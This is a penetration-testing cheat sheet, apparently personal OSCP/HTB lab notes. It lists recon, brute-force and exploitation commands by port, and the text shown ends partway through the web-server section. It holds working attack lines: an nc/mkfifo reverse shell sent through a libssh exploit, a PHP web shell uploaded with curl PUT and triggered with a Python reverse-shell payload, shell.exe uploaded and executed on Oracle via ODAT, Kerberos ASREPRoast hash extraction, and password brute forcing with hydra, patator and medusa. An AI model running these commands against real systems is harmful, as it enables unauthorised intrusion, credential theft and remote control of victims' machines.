Table of Contents
=================

   * [Table of Contents](#table-of-contents)
   * [<strong>Recon</strong>](#recon)
      * [Enumeration AIO](#enumeration-aio)
      * [File enumeration](#file-enumeration)
         * [Common](#common)
         * [Disk files](#disk-files)
         * [Images](#images)
         * [Audio](#audio)
      * [Port 21 - FTP](#port-21---ftp)
      * [Port 22 - SSH](#port-22---ssh)
      * [Port 25 - Telnet](#port-25---telnet)
      * [Port 69 - UDP - TFTP](#port-69---udp---tftp)
      * [Kerberos - 88](#kerberos---88)
      * [Port 110 - Pop3](#port-110---pop3)
      * [Port 111 - Rpcbind](#port-111---rpcbind)
      * [Port 135 - MSRPC](#port-135---msrpc)
      * [Port 139/445 - SMB](#port-139445---smb)
      * [Port 161/162 UDP - SNMP](#port-161162-udp---snmp)
      * [LDAP - 389,636](#ldap---389636)
      * [HTTPS - 443](#https---443)
      * [500 - ISAKMP IKE](#500---isakmp-ike)
      * [513 - Rlogin](#513---rlogin)
      * [541 - FortiNet SSLVPN](#541---fortinet-sslvpn)
      * [Port 554 - RTSP](#port-554---rtsp)
      * [Port 1030/1032/1033/1038](#port-1030103210331038)
      * [MSSQL - 1433](#mssql---1433)
      * [Port 1521 - Oracle](#port-1521---oracle)
      * [Port 2049 - NFS](#port-2049---nfs)
      * [Port 2100 - Oracle XML DB](#port-2100---oracle-xml-db)
      * [3306 - MySQL](#3306---mysql)
      * [Port 3339 - Oracle web interface](#port-3339---oracle-web-interface)
      * [RDP - 3389](#rdp---3389)
      * [WinRM - 5985](#winrm---5985)
      * [VNC - 5900](#vnc---5900)
      * [Redis - 6379](#redis---6379)
      * [MsDeploy - 8172](#msdeploy---8172)
      * [Webdav](#webdav)
      * [Unknown ports](#unknown-ports)
      * [Port 80 - Web server](#port-80---web-server)
         * [Url brute force](#url-brute-force)
         * [Default/Weak login](#defaultweak-login)
         * [LFI/RFI](#lfirfi)
         * [SQLi](#sqli)
         * [XSS](#xss-port-80)
         * [Sql-login-bypass](#sql-login-bypass)
         * [Bypass image upload restrictions](#bypass-image-upload-restrictions)
      * [Password brute force - last resort](#password-brute-force---last-resort)
   * [<strong>Vulnerability analysis</strong>](#vulnerability-analysis)
      * [BOF](#bof)
      * [Find xploits - Searchsploit and google](#find-xploits---searchsploit-and-google)
      * [Reverse Shells](#reverse-shells)
      * [Elastix and vtigercrm ](#elastix-and-vtigercrm)
      * [NVMS](#nvms)
   * [<strong>Privilege escalation</strong>](#privilege-escalation)
      * [Common](#common-1)
         * [Set up Webserver](#set-up-webserver)
         * [Set up FTP Server](#set-up-ftp-server)
         * [Set up TFTP](#set-up-tftp)
         * [Upgrade Shell](#upgrade-shell)
         * [Insecure Functions](#insecure-functions)
         * [Alternate Data Stream](#alternate-data-stream)
      * [Linux](#linux)
         * [Useful commands](#useful-commands)
         * [Basic info](#basic-info)
         * [Kernel exploits](#kernel-exploits)
         * [Programs running as root](#programs-running-as-root)
         * [Installed software](#installed-software)
         * [Weak/reused/plaintext passwords](#weakreusedplaintext-passwords)
         * [Inside service](#inside-service)
         * [Suid misconfiguration](#suid-misconfiguration)
         * [Unmounted filesystems](#unmounted-filesystems)
         * [Cronjob](#cronjob)
         * [SSH Keys](#ssh-keys)
         * [Bad path configuration](#bad-path-configuration)
         * [Find plain passwords](#find-plain-passwords)
         * [Scripts](#scripts)
            * [SUID](#suid)
            * [PS Monitor for cron](#ps-monitor-for-cron)
         * [Linux Privesc Tools](#linux-privesc-tools)
         * [Linux Precompiled Exploits](#linux-precompiled-exploits)
         * [Nohup](#nohup)
         * [RedHat / CentOS](#redhat-'/'-centos)
         * [GTFObins](#gtfobins)
      * [Windows](#windows)
         * [Basic info](#basic-info-1)
         * [Kernel exploits](#kernel-exploits-1)
         * [Cleartext passwords](#cleartext-passwords)
         * [Reconfigure service parameters](#reconfigure-service-parameters)
         * [Dump process for passwords](#dump-process-for-passwords)
         * [Inside service](#inside-service-1)
         * [Programs running as root/system](#programs-running-as-rootsystem)
         * [Installed software](#installed-software-1)
         * [Scheduled tasks](#scheduled-tasks)
         * [Weak passwords](#weak-passwords)
         * [Add user and enable RDP](#add-user-and-enable-rdp)
         * [Powershell sudo for Windows](#powershell-sudo-for-windows)
           * [Powershell Method 1](#powershell-method-1)
           * [Powershell Method 2](#powershell-method-2)
         * [Windows download with bitsadmin](#windows-download-with-bitsadmin)
         * [Windows download with certutil.exe](#windows-download-with-certutilexe)
         * [Windows download with powershell](#windows-download-with-powershell)
         * [Windows Download from FTP](#windows-download-from-ftp)
         * [Windows create SMB Server transfer files](#windows-create-smb-server-transfer-files)
         * [Windows download with VBS](#windows-download-with-vbs)
         * [Windowss XP SP1 PrivEsc](#windowss-xp-sp1-privesc)
         * [Pass The Hash](#pass-the-hash)
         * [Scripts](#scripts-1)
            * [Useradd](#useradd)
            * [Powershell Run As](#powershell-run-as)
            * [Powershell Reverse Shell](#powershell-reverse-shell)
            * [Powershell Non-interactive Execute Powershell File](#powershell-non-interactive-execute-powershell-file)
         * [Windows privesc/enum tools](#windows-privescenum-tools)
         * [Windows precompiled exploits](#windows-precompiled-exploits)
         * [Windows Port Forwarding](#windows-port-forwarding)
         * [Windows DnsAdmins and Explotation of DLL](#windows-dnsadmins-and-explotation-of-dll)
         * [See Users and Objects Eliminated From AD](#see-users-and-objects-eliminated-from-ad)
         * [Dump Passwords Hashes from Active Directory](#dump-passwords-hashes-from-active-directory)
         * [Azure AD](#azure-ad)
	 
	 
   * [<strong>Loot</strong>](#loot)
      * [Linux](#linux-1)
         * [Proof](#proof)
         * [Network secret](#network-secret)
         * [Passwords and hashes](#passwords-and-hashes)
         * [Dualhomed](#dualhomed)
         * [Tcpdump](#tcpdump)
         * [Interesting files](#interesting-files)
         * [Databases](#databases)
         * [SSH-Keys](#ssh-keys-1)
         * [Browser](#browser)
         * [Mail](#mail)
         * [GUI](#gui)
         * [ShellShock](#shellshock)
         * [Grep](#grep)
      * [Windows](#windows-1)
         * [Proof](#proof-1)
         * [Passwords and hashes](#passwords-and-hashes-1)
         * [Dualhomed](#dualhomed-1)
         * [Tcpdump](#tcpdump-1)
         * [Interesting files](#interesting-files-1)
         * [VNC Crack Server Encrypted Password](#vnc-crack-server-encrypted-password)
         * [Decompile Binaries](#decompile-binaries)
   * [<strong>Data Bases Tips</strong>](#data-bases)
      * [SQLite3](#sqlite3)
      * [MySQL Dump](#mysql-dump)
   * [<strong>Web</strong>](#web)
      * [Test SSL](#test-ssl)
      * [HTML Parameter Pollution](#html-parameter-pollution-hpp)
         * [Server-Side HPP](#server-side-hpp)
         * [Client-Side HPP](#client-side-hpp)
      * [Fuzzing Directories](#fuzzing-directories)
      * [HTML Injection](#html-injection)
      * [XSS](#xss)
      * [CORS](#cors)
      * [Scanners](#scanners)
      * [Business Logic](#business-logic)
      * [Change Methods HTTP](#change-methods-http)
      * [PHP Type Juggling](#php-type-juggling)
      * [Host Header Injection](#host-header-injection)
      * [Adobe AEM Flush Cache Dispatcher](#adobe-aem-flush-cache-dispatcher)
      * [Open Redirection](#open-redirection)
      * [Parameter Tampering](#parameter-tampering)
      * [File Inclusion](#file-inclusion)
      * [Missing Insufficient SPF Record](#missing-insufficient-spf-record)
      * [External Service Interaction DNS](#external-service-interaction-dns)
      * [SSRF](#ssrf)
      * [Critical File and Source Code Disclosure](#critical-file-and-source-code-disclosure)
      * [CSRF](#csrf)
      * [SQL Injection](#sql-injection)
      * [Command Injection](#command-injection)
      * [XXE](#xxe)
      * [PHPinfo Injection](#phpinfo-injection)
   * [<strong>Cryptography</strong>](#cryptography)
      * [Identify Cipher](#identify-cipher)
      * [Ciphers](#ciphers)
         * [AES](#aes)
   * [<strong>Stego</strong>](#stego)
      * [Tools](#tools)
         * [steghide](#steghide)
         * [stegpy](#stegpy)
         * [bpstegano](#bpstegano)
         * [foremost](#foremost)
         * [stegsolve](#stegsolve)
         * [strings](#strings)
         * [exiftool](#exiftool)
         * [exiv2](#exiv2)
         * [binwalk](#binwalk)
         * [zsteg](#zsteg)
         * [wavsteg](#wavsteg)
         * [sonic visualizer](#sonic-visualizer)
         * [hexeditor](#hexeditor)
         * [turgen system](#turgen-system)
      * [Techniques](#techniques)
         * [GIF by frames](#gif-by-frames)
         * [Scan entropy](#scan-entropy)
         * [BAR & QR code ](#bar-&-qr-code )
         * [DNA code](#dna-code)
         * [Magic Numbers](#magic-numbers)
         * [Decode WAV file with TurgenSystem](#decode-wav-file-with-turgensystem)
         * [Binary Data to Image PNG](#binary-data-to-image-png)
      * [Brute Force in Image, ZIP, Audio](#brute-force-in-image-zip-audio)
         * [Stegcracker](#stegcracker)
         * [fcrackzip](#fcrackzip)
      * [Online Decoders](#online-decoders)
         * [Unicode Text Steganography](#unicode-text-steganography)
         * [npiet](#npiet)
         * [dcode fr](#dcode-fr)
         * [Cyber Chef](#cyber-chef)
         * [Cipher Identifier](#cipher-identifier)
   * [<strong>Forensic</strong>](#forensic)
      * [Tools](#tools-forensics)
         * [Volatility](#volatility)
   * [<strong>Python</strong>](#python)
      * [Web Scraping](#web-scraping)
      * [Functions Vulnerable](#functions-vulnerable)
   * [<strong>Brute Force ALL</strong>](#brute-force-all)
      
# **Recon**

```
# Enumerate subnet
nmap -sn 10.11.1.1/24

# Fast simple scan
nmap -sS 10.11.1.111

# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full 10.11.1.111

# Autorecon
python3 autorecon.py 10.11.1.111

# OneTwoPunch
https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
onetwopunch.sh ip.txt tcp

# Scan for UDP
nmap 10.11.1.111 -sU
unicornscan -mU -v -I 10.11.1.111

# Connect to udp if one is open
nc -u 10.11.1.111 48772

# Responder
responder -I eth0 -A

# Amass
amass enum -ip 10.11.1.1/24

```
- sparta
- `python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services`


## Enumeration AIO
[Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)

## File enumeration

### Common

```bash
# Check real file type
file file.xxx

# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars

# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract

# Check as binary file in hex
ghex file.xxx

# Check metadata
exiftool file.xxx

# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```

### Disk files

```bash
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

### Images

```bash
# Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image is
identify -verbose image.jpeg
```

### Audio

```bash
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# Check for Stego
hideme stego.mp3 -f && cat output.txt #AudioStego
```



## Port 21 - FTP

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
```

## Port 22 - SSH

- If you have usernames test login with username:username
- Vulnerable Versions: 7.2p1

```bash
Vulnerable Versions: 7.2p1
nc 10.11.1.111 22

User can ask to execute a command right after authentication before it’s default command or shell is executed

$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

Check Auth Methods:

$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

Force Auth Method:

$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

BruteForce:

patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

SSH FUZZ
https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

SSH-AUDIT
https://github.com/arthepsy/ssh-audit

• https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
• https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution                             
• https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration                             
• https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files                             

http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html


SSH Enum users < 7.7:
https://github.com/six2dez/ssh_enum_script
https://www.exploit-db.com/exploits/45233
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"


# Copy a file from Victim to your Host

scp <user>@<ip>:/path/for/your/file /path/box/attacker (FROM YOUR HOST RUN THIS COMMAND)

root@cgonzalo:~/# scp charix@10.10.10.84:/home/charix/secret.zip /root/Documentos/htb/box/borrar


# SSH Tunneling

ssh -L <localPort>:<ipVictimLocal>:<portVictimForService> <user>@<ipVictim> (FROM ATTACKER BOX)
ssh -L 4444:127.0.0.1:5901 charix@10.10.10.84

# SSH Tunneling / Pivoting

sshuttle -vvr user@target 10.1.1.0/24

# Local port forwarding

ssh <gateway> -L <local port to listen>:<remote host>:<remote port>

# Remote port forwarding

ssh <gateway> -R <remote port to bind>:<local host>:<local port>

# Dynamic port forwarding

ssh -D <local proxy port> -p <remote port> <target>

# Plink local port forwarding

plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
```


## Port 25 - Telnet

```
nc -nvv 10.11.1.111 25
HELO foo<cr><lf>

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

Send email unauth:

MAIL FROM:admin@admin.com
RCPT TO:DestinationEmail@DestinationDomain.com
DATA
test

.

Receive:
250 OK
```

## Port 69 - UDP - TFTP

This is used for tftp-server.

- Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
- Checks of FTP Port 21.

```
nmap -p69 --script=tftp-enum.nse 10.11.1.111
```

## Kerberos - 88

```
- MS14-068

# ASREPRoast
The ASREPRoast attack is based on finding users who do not require Kerberos pre-authentication.

(LINUX) The following commands allow you to use a list of users or given a credential, perform an LDAP query to get users to attack on:

python GetNPUsers.py -dc-ip <ip> <domain>/ -usersfile <users.txt> -format <john/hashcat> -outputfile <hashesForCrack.asreproast>

And crack it:

john --wordlist=/usr/share/wordlists/rockyou.txt <hashesParaCrackear.asreproast>


Resource: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

# Users Enumeration

use auxiliary/gather/kerberos_enumusers
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IP

# Brute Force Users

python kerbrute.py -dc-ip <ip> -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>


# CheatSheet Kerberos

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

# Resources

Resource: https://www.tarlogic.com/blog/como-funciona-kerberos/
Resource: https://www.tarlogic.com/blog/como-atacar-kerberos/
Resource: https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
```

## Port 110 - Pop3

```
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

## Port 111 - Rpcbind

```
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
```


## Port 135 - MSRPC

Some versions are vulnerable.

```
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## Port 139/445 - SMB


```
# Enumeration

nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

enum4linux -a 10.11.1.111


# RPC

rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall


# SMB Client

smbclient -L 10.11.1.111
smbclient //10.11.1.111/tmp
smbclient \\\\10.11.1.111\\ipc$ -U john
smbclient //10.11.1.111/ipc$ -U john  


# Recursive Enumeration Inside of SMBClient

smb: \> recurse on                                                                                                                   
smb: \> ls  


# Download a Complete Resource

smbget -R  smb://10.10.10.178/Data/ -U TempUser


# Access to Resource

- Path of resource: /example/<resource>

smb: \> cd example
NT_STATUS_ACCESS_DENIED

smb: \> cd example/<resource>
ACCESS OK


# Users Enumeration & Login

msf5 > use auxiliary/scanner/smb/smb_login
msf5 > use auxiliary/scanner/smb/smb_enumusers


# Search Vulnerabilities

searchsploit <Samba version>



winexe -U username //10.11.1.111 "cmd.exe" --system

smbtree 10.11.1.111

nmblookup -A 10.11.1.111

smbmap -u victim -p s3cr3t -H 10.11.1.111

Inside \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml can found user and passwrod, decrypt with "gpp-decrypt "

# Mount SMB in Linux

mount -t cifs -o username=user,password=password //10.11.1.111/share /mnt/share
```


## Port 161/162 UDP - SNMP

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community

```

## LDAP - 389,636

```
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
ldapsearch -x -h 10.11.1.111 -D 'DOMAIN\user' -w 'hash-password'
ldapdomaindump 10.11.1.111 -u 'DOMAIN\user' -p 'hash-password'
patator ldap_login host=10.10.1.111 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
```

## HTTPS - 443

Read the actual SSL CERT to:

- find out potential correct vhost to GET
- is the clock skewed
- any names that could be usernames for bruteforce/guessing.

```
sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 10.1.10.111
mod_ssl,OpenSSL version Openfuck
```

## 500 - ISAKMP IKE

```
ike-scan 10.11.1.111
```

## 513 - Rlogin

```
apt install rsh-client
rlogin -l root 10.11.1.111
```

## 541 - FortiNet SSLVPN

[Fortinet Ports Guide](https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png)

[SSL VPN Leak](https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ)

## Port 554 - RTSP

- Web interface, transfer images, streaming


## Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

## MSSQL - 1433

```
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
	xp_cmdshell 'date'
  	go

```

## Port 1521 - Oracle

```
oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe


```

## Port 2049 - NFS

```
showmount -e 10.11.1.111

If you find anything you can mount it like this:

1)

- mkdir nfs2

2)
- mount -t nfs <ip_victim>:<path_remote_found> <path_local_for_mount>
- mount <ip_victim>:/ /tmp/NFS
- mount -t <ip_victim>:/ /tmp/NFS
```

## Port 2100 - Oracle XML DB

```
FTP:
	sys:sys
	scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm


## 3306 - MySQL

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

MYSQL UDF 
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```
Credentials Gathering Script
```
You get a "username", "Database", "Challenge" and "Response" (the two last is the password)
use auxiliary/server/capture/mysql (when you can control that a DB connect to you own server)
```

Basic Commands
```
mysql -u root
create database [DB_NAME];
create user '[USER_NAME]' identified by '[PASSWORD]'
grant all privileges on [DB_NAME].* to '[USER_NAME]'@'%';
flush privileges;
show databases;
use [DB_NAME]
show tables;

create table [TABLE_NAME] ( [COLUMN_01_NAME] varchar(32), [COLUMN_02_NAME] varchar(32) );

insert into [TABLE_NAME] values( '[VALUE_COLUMN_01_NAME]', '[VALUE_COLUMN_02_NAME]' ):

(See "kryptos" box in htb for referencies)
```
## Port 3339 - Oracle web interface


- Basic info about web service (apache, nginx, IIS)

## RDP - 3389

```
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
```

## VNC - 5900

```
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111

# Connect to VNC

vncviewer <ipVictim>:<portVictim> -passwd <file_password>

vncviewer localhost:4444 -passwd secret (SSH tunneling done previously)

Reference: poison box (htb)
```

## WinRM - 5985

```
https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
```

## Redis - 6379

```
https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis
```

## MsDeploy - 8172

```
Microsoft IIS Deploy port
IP:8172/msdeploy.axd
```

## Webdav

```
davtest -cleanup -url http://target
cadaver http://target
```

## Unknown ports

- `amap -d 10.11.1.111 8000`
- netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
- sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, 	using basic HTTP configurations
- Try zone transfer for subdomains: `dig axfr @10.11.1.111 hostname.box`, `dnsenum 10.11.1.111`, `dnsrecon -d domain.com -t axfr`

Try admin:admin, user:user

## Port 80 - Web server

- Basics:
  - Navigate && robots.txt
  - Headers
  - Source Code

```
# Subdomains
https://github.com/infosec-au/altdns
https://github.com/OWASP/Amass
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101
https://github.com/mrnfrancesco/yass

# Nikto
nikto -h http://10.11.1.111

# Nikto with squid proxy
nikto -h 10.11.1.111 -useproxy http://10.11.1.111:4444

# CMS Explorer
cms-explorer -url http://10.11.1.111 -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.11.1.111
wpscan --url http://10.11.1.111 --enumerate vp
wpscan --url http://10.11.1.111 --enumerate vt
wpscan --url http://10.11.1.111 --enumerate u
wpscan -e --url https://url.com


Check IP behing WAF:
https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
pingback.xml:
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://IP.com/2020/01/22/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>

curl -X POST -d @pingback.xml https://ip.com/xmlrpc.php

Enum User:
for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# Get header
curl -i 10.11.1.111

# Get options
curl -i -X OPTIONS 10.11.1.111

	# With PUT option enabled:
	
	nmap -p 80 10.1.10.111 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'

	curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.1.10.111/test/cmd.php
	&& http://10.1.10.111/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%210.1.10.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

# Get everything
curl -i -L 10.11.1.111
curl -i -H "User-Agent:Mozilla/4.0" http://10.11.1.111:8080

# Check for title and all links
curl 10.11.1.111 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.11.1.111 -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://10.11.1.111/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

site:domain.com intext:user


# Firebase
https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file

```

### Url brute force

```
# Ffuf
ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.11.1.11/mvc/FUZZ

# Dirb not recursive
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# Wfuzz
